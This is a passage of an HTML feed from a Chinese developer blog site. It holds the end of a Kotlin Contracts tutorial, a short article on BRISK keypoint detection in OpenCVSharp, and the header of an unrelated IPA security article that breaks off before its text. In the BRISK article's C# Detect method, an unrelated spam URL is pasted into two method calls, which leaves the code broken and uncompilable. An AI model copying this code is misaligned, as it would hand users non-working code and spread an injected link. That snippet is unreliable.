    <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpError</span>(<span class="hljs-keyword">val</span> code: <span class="hljs-built_in">Int</span>) : Failure()
    <span class="hljs-comment">// Insert other failure types here</span>
}
<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Result</span>&lt;<span class="hljs-type">out T, out F : Failure</span>&gt; {
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Success</span>&lt;<span class="hljs-type">T</span>&gt;(<span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span>: T) : Result&lt;T, <span class="hljs-built_in">Nothing</span>&gt;()
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Failed</span>&lt;<span class="hljs-type">F : Failure</span>&gt;(<span class="hljs-keyword">val</span> failure: F) : Result&lt;<span class="hljs-built_in">Nothing</span>, F&gt;()
}
<span class="hljs-meta">@OptIn(ExperimentalContracts::class)</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T, F : Failure&gt;</span> Result<span class="hljs-type">&lt;T, F&gt;</span>.<span class="hljs-title">isHttpError</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    contract {
	    <span class="hljs-comment">// 使用Contracts 来断言泛型类型, 此处编译器将不再报错(仅限于 contract 内部)</span>
        returns(<span class="hljs-literal">true</span>) implies (<span class="hljs-keyword">this</span><span class="hljs-symbol">@isHttpError</span> <span class="hljs-keyword">is</span> Result.Failed&lt;Failure.HttpError&gt;)
    }
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> Result.Failed &amp;&amp; <span class="hljs-keyword">this</span>.failure <span class="hljs-keyword">is</span> Failure.HttpError
}
</code></pre>
<p>同样的，要启用这些功能也需要添加额外的编译器选项（与操作符中的编译选项一致）</p>
<pre><code class="hljs language-kotlin" lang="kotlin">kotlin {
    compilerOptions {
        freeCompilerArgs.add(<span class="hljs-string">"-Xallow-contracts-on-more-functions"</span>)
    }
}
</code></pre>
<blockquote>
<p>⚠️ PS: 与 其它 Kotlin 2.2.20新增的特性一样，在当前最新的 AS 中泛型断言特性，IDE仍然会 提示错误：<code>Error in contract description: instance check for erased type.</code> 如果配置正确，可以忽略 IDE 报错警告！</p>
</blockquote>
<p>上面的示例的含义是：开发者告诉编译器，我确定调用 isHttpError 的这个 result 是 <code>Result.Failed&lt;Failure.HttpError&gt;</code>的一个实例</p>
<p>这个断言不是真在运行时检查类型 (像 <code>reified</code> 那样)，而是 <strong>编译时 (或静态分析) 提示编译器</strong> “我承诺这种类型关系在满足合约时成立”。编译器据此可以做智能推断 、类型安全分析等。</p>
<p><strong>与 <code>reified</code> 的区别 :</strong></p>
<p>先简单介绍下 reified :</p>
<p>由于泛型类型擦除的原因，<strong>在普通 (non-inline) 函数里</strong>你无法在运行时做 <code>value is T</code> 这样的类型检查 ，因为 <code>T</code> 在运行时的信息不可用。</p>
<ul>
<li>
<p>Kotlin 引入了 <code>reified</code> 关键字 + <code>inline</code> 函数来“实化”类型参数。所谓实化，就是编译器在调用处把函数展开 (inline)，并用实际类型把类型参数替换。这样在调用点，类型是具体的，而不是泛型参数。</p>
</li>
<li>
<p>举例：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T&gt;</span> <span class="hljs-title">isType</span><span class="hljs-params">(item: <span class="hljs-type">Any</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
  <span class="hljs-keyword">return</span> item <span class="hljs-keyword">is</span> T
}
</code></pre>
<p>当你调用 <code>isType&lt;String&gt;("hello")</code> 时，编译器把这一调用处内联展开，变成类似 <code>"hello" is String</code>，类型检查就能在运行时执行。</p>
</li>
<li>
<p><strong>限制</strong>：</p>
<ul>
<li><code>reified</code> 只能和 <code>inline</code> 一起使用，因为需要将函数展开</li>
<li>即便如此，你也不能对 <strong>带泛型参数</strong>完全检查所有层级。例如，你不能在 reified 函数中安全地做 <code>value is List&lt;String&gt;</code>，因为泛型参数 <code>&lt;String&gt;</code> 仍被擦除，你可以检查的是 <code>List&lt;*&gt;</code> 这样的原始类型</li>
</ul>
</li>
</ul>
<p>因此，inline + reified 与 Contracts 的泛型类型断言 解决的问题是不相同的，是两个无关的功能</p>
<p>至此，截至最新的 Kotlin ，Contras 的所有功能已经讲述完毕！</p>
<h2 data-id="heading-11">自定义 Contracts</h2>
<p>Kotlin 标准库内部已经在很多基础函数中使用了 Contracts ,即使大家不了解这个特性，但可能早就已经在项目中间接用上了这个特性。</p>
<p>上面我们已经了解了基于最新版 Kotlin 中 Contracts 的所有特性，其实我们已经发现了 自定义 Contracts 的一些要求和限制，需要注意什么、能做什么、不能做什么，现在总结一下：</p>
<ol>
<li>
<p>实验性：<code>@OptIn(ExperimentalContracts::class)</code></p>
<ul>
<li>Kotlin Contracts 是实验性的(Experimental)，所以在你自定义的 Contracts 所在的函数上面必须声明：<code>@OptIn(ExperimentalContracts::class)</code> 注解。</li>
<li>另外，如果使用Kotlin 2.2.20 中新增的函数(<code>condition implies returnsNotNull()</code> 和 <code>holdsIn</code>) 需要额外再添加<code>@OptIn(ExperimentalExtendedContracts::class)</code> 注解，并且Kotlin 2.2.20 所有的新特性都要添加对应的 编译器选项。</li>
<li>由于是实验特性，其语法、行为在未来 Kotlin 版本可能发生变动。</li>
<li>编译器是无条件信任合法的 Contracts 的，不会在运行时强制验证你的合约是否真的被满足，因此开发者需要自己负责使用了<strong>自定义的Contracts 的函数</strong>中的逻辑正确性。</li>
</ul>
</li>
<li>
<p>Contracts 块的位置和语法要求：</p>
<ul>
<li>
<p><code>contract { … }</code> 必须是函数体内的第一条语句</p>
</li>
<li>
<p><code>contract { … }</code> 内部只能使用<code>ContractBuilder</code> 接口中定义了的effect 方法以及 继承了 Effect 接口的所有 Effect ( <code>returns()</code>, <code>returns(value:Any?)</code>, <code>returnsNotNull()</code>, <code>simpleEffect implies condition</code>,<code>condition implies returnsNotNull()</code>,<code>callsInPlace(...)</code>, <code>holdsIn</code>)</p>
</li>
<li>
<p><code>contract { … }</code> 内只能引用当前函数的参数，不能引用局部变量和其它作用域变量</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">example</span><span class="hljs-params">(param1: <span class="hljs-type">String</span>?, param2: <span class="hljs-type">Int</span>)</span></span> {
    contract {
        <span class="hljs-comment">// ✅ 只能引用函数参数</span>
        returns() implies (param1 != <span class="hljs-literal">null</span>)
        
        <span class="hljs-comment">// ❌ 不能引用局部变量或其他作用域的变量</span>
        <span class="hljs-comment">// returns() implies (localVar != null)  // 错误</span>
    }
    <span class="hljs-keyword">val</span> localVar = <span class="hljs-string">"test"</span>
}
</code></pre>
</li>
<li>
<p>类型检查表达式限制：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">example</span><span class="hljs-params">(obj: <span class="hljs-type">Any</span>?)</span></span> {
    contract {
        <span class="hljs-comment">// ✅ 允许：简单的类型检查</span>
        returns() implies (obj <span class="hljs-keyword">is</span> String)
        returns() implies (obj != <span class="hljs-literal">null</span>)
        
        <span class="hljs-comment">// ❌ 限制：复杂的表达式</span>
        <span class="hljs-comment">// returns() implies (obj.toString().length &gt; 5)  // 错误</span>
        <span class="hljs-comment">// returns() implies (someFunction(obj))         // 错误</span>
    }
}
</code></pre>
</li>
<li>
<p>Contract {} 内的代码只会影响编译器，不会影响运行时，因为<code>contract { … }</code> 本身在字节码中没有运行时逻辑 (即标准库中 <code>contract { … }</code> 是空实现) ，它是给编译器看的 DSL</p>
</li>
</ul>
</li>
<li>
<p>函数类型限制：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ✅ 支持：顶层函数、成员函数、扩展函数</span>
<span class="hljs-comment">// 以及 Kotlin2.2.20 中新增的 getter和操作符函数（参见 2.2.20 Contracts 新特性）</span>

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">topLevelFunction</span><span class="hljs-params">()</span></span> { <span class="hljs-comment">/* ... */</span> }
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">memberFunction</span><span class="hljs-params">()</span></span> { <span class="hljs-comment">/* ... */</span> }
}
<span class="hljs-function"><span class="hljs-keyword">fun</span> String.<span class="hljs-title">extensionFunction</span><span class="hljs-params">()</span></span> { <span class="hljs-comment">/* ... */</span> }

<span class="hljs-comment">// ❌ 不支持：局部函数、匿名函数、lambda 表达式</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">outerFunction</span><span class="hljs-params">()</span></span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">localFunction</span><span class="hljs-params">()</span></span> {
        contract { <span class="hljs-comment">/* ... */</span> }  <span class="hljs-comment">// 编译错误</span>
    }
}
</code></pre>
</li>
</ol>
<p>以上是就是我对 Kotlin Contracts 的所有讲解，希望能帮到大家，Kotlin Contracts 是一个相比其它特性较为冷门的高级特性，并且对于自定义 Contracts 至今仍然是 实验性的，大家有什么自己的见解或者对本文内容有不同的理解，欢迎讨论！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenCVSharp：BRISK特征检测]]></title>    <link>https://juejin.cn/post/7574869203447693312</link>    <guid>https://juejin.cn/post/7574869203447693312</guid>    <pubDate>2025-11-21T05:15:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574869203447693312" data-draft-id="7574704948154023988" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenCVSharp：BRISK特征检测 "/> <meta itemprop="keywords" content="OpenCV"/> <meta itemprop="datePublished" content="2025-11-21T05:15:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户722786812344"/> <meta itemprop="url" content="https://juejin.cn/user/4100515739233513"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenCVSharp：BRISK特征检测 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4100515739233513/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户722786812344
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T05:15:58.000Z" title="Fri Nov 21 2025 05:15:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述</h2>
<p>BRISK（Binary Robust Invariant Scalable Keypoints）是一种快速、高效的特征检测和描述算法，由Stefan Leutenegger等人于2011年提出。它属于二进制特征描述符家族，与SIFT、SURF等浮点型特征描述符相比，具有计算速度快、内存占用小的特点。</p>
<p>BRISK是一种平衡了速度和性能的特征检测算法，特别适合需要实时处理的应用场景。虽然其精度可能不如SIFT或SURF，但在许多实际应用中，其速度优势更为重要。在OpenCV中，BRISK被广泛应用于需要快速特征检测和匹配的计算机视觉任务中。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d210977bd1d8474ca1047fb245d62b2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764306957&amp;x-signature=zPQxtJvBkAIUETsA2W3C4%2Fw0YxU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">实践</h2>
<p>示例中的核心代码很少：</p>
<pre><code class="hljs language-scss" lang="scss">using <span class="hljs-selector-tag">var</span> brisk = BRISK<span class="hljs-selector-class">.Create</span>();
KeyPoint<span class="hljs-selector-attr">[]</span> keypoints = brisk<span class="hljs-selector-class">.Detect</span>(gray);

if (keypoints != null)
{
    <span class="hljs-selector-tag">var</span> <span class="hljs-attribute">color</span> = new <span class="hljs-built_in">Scalar</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>);
    foreach (KeyPoint kpt in keypoints)
    {
        <span class="hljs-attribute">float</span> r = kpt<span class="hljs-selector-class">.Size</span> / <span class="hljs-number">2</span>;
        Cv2<span class="hljs-selector-class">.Circle</span>(dst, (Point)kpt<span class="hljs-selector-class">.Pt</span>, (int)r, <span class="hljs-attribute">color</span>);
        Cv2<span class="hljs-selector-class">.Line</span>(dst,
            (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X + r, kpt.Pt.Y + r),
            (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X - r, kpt.Pt.Y - r),
            <span class="hljs-attribute">color</span>);
        Cv2<span class="hljs-selector-class">.Line</span>(dst,
            (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X - r, kpt.Pt.Y + r),
            (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X + r, kpt.Pt.Y - r),
            <span class="hljs-attribute">color</span>);
    }
}
</code></pre>
<p>OpenCVSharp中封装了一个BRISK，现在来看看这个类的Create方法：</p>
<pre><code class="hljs language-csharp" lang="csharp">  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> BRISK <span class="hljs-title">Create</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> thresh = <span class="hljs-number">30</span>, <span class="hljs-built_in">int</span> octaves = <span class="hljs-number">3</span>, <span class="hljs-built_in">float</span> patternScale = <span class="hljs-number">1.0f</span></span>)</span>
  {
      NativeMethods.HandleException(
          NativeMethods.features2d_BRISK_create1(thresh, octaves, patternScale, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> ptr));
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> BRISK(ptr);
  }
</code></pre>
<p>先了解一下参数的意义：</p>
<p><strong>thresh（AGAST检测阈值）</strong></p>
<p>基于AGAST（Adaptive and Generic Accelerated Segment Test）算法的阈值，用于判断像素点是否为角点，控制特征点检测的敏感度。</p>
<p>较低值（如10-20）：检测更多特征点，但可能包含噪声</p>
<p>较高值（如40-60）：检测更少但更稳定的特征点</p>
<p><strong>octaves（检测八度数）</strong></p>
<p>构建图像金字塔，在不同尺度上检测特征点，控制多尺度检测的层数。</p>
<p>0：仅进行单尺度检测，速度最快</p>
<p>1-4：多尺度检测，能识别不同大小的特征</p>
<p>更高值：增加尺度范围但降低性能</p>
<p><strong>patternScale（采样模式缩放）</strong></p>
<p>BRISK使用特定的采样模式来计算描述符，此参数控制该模式的缩放，整特征点邻域采样模式的缩放比例。</p>
<p><code>&lt; 1.0</code>：更密集的采样，可能提高精度但降低速度</p>
<p><code>&gt; 1.0</code>：更稀疏的采样，提高速度但可能降低精度</p>
<p>再来看一下Detect方法：</p>
<pre><code class="hljs language-csharp" lang="csharp"> <span class="hljs-function"><span class="hljs-keyword">public</span> KeyPoint[] <span class="hljs-title">Detect</span>(<span class="hljs-params">Mat image, Mat? mask = <span class="hljs-literal">null</span></span>)</span>
 {
     <span class="hljs-keyword">if</span> (image <span class="hljs-keyword">is</span> <span class="hljs-literal">null</span>)
         <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(image));
     ThrowIfDisposed(https:<span class="hljs-comment">//www.falvce.com/);</span>

     image.ThrowIfDisposed();
     <span class="hljs-keyword">try</span>
     {
         <span class="hljs-keyword">using</span> <span class="hljs-keyword">var</span> keyPoints = <span class="hljs-keyword">new</span> VectorOfKeyPoint();
         NativeMethods.HandleException(
             NativeMethods.features2d_Feature2D_detect_Mat1(ptr, image.CvPtr, keyPoints.CvPtr, Cv2.ToPtr(mask)));
         <span class="hljs-keyword">return</span> keyPoints.ToArray(https:<span class="hljs-comment">//www.falvce.com/);</span>
     }
     <span class="hljs-keyword">finally</span>
     {
         GC.KeepAlive(<span class="hljs-keyword">this</span>);
         GC.KeepAlive(image);
         GC.KeepAlive(mask);
     }
 }
</code></pre>
<p>直接使用这个方法就可以获取特征点：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e856a5da7a94418a9fae4374d526e65c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764306957&amp;x-signature=if%2FAVI1sE6%2FHKQCElJ5xM7Uys4I%3D" alt="" loading="lazy"/></p>
<p>然后在图像上显示这些特征点即可得到上面的图。</p>
<p>我看到说BRISK可以用于物体识别，我在想既然会生成特征点，那么肯定可以进行特征点匹配，这样能不能拿两张图去匹配，比如两个人有两张不同的照片能不能识别出是同一个人呢？</p>
<p>我做了一个简单的Demo，但是效果其实不好：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/608e4c90eaae42de86a9a643d0958a2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764306957&amp;x-signature=pKQLe%2BIf79G0TQrdBij39tRKgfA%3D" alt="" loading="lazy"/></p>
<p>没有后面DrawBestMatchRectangle这个示例的效果好，后面这个示例使用的是ORB，然后也有使用汉明匹配，等后面再介绍。</p>
<p>DrawBestMatchRectangle示例效果：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a7ef353a94047be906c679b355f9178~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764306957&amp;x-signature=8PwEJYrElG28eUfpYnmexr1d%2Bqk%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何提高 IPA 安全性 面向工程团队的多层安全策略与工具协同方案]]></title>    <link>https://juejin.cn/post/7574869203447857152</link>    <guid>https://juejin.cn/post/7574869203447857152</guid>    <pubDate>2025-11-21T05:48:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574869203447857152" data-draft-id="7574869203447840768" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何提高 IPA 安全性 面向工程团队的多层安全策略与工具协同方案"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-21T05:48:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="星星电灯猴"/> <meta itemprop="url" content="https://juejin.cn/user/2848205394945444"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何提高 IPA 安全性 面向工程团队的多层安全策略与工具协同方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2848205394945444/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    星星电灯猴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T05:48:49.000Z" title="Fri Nov 21 2025 05:48:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid 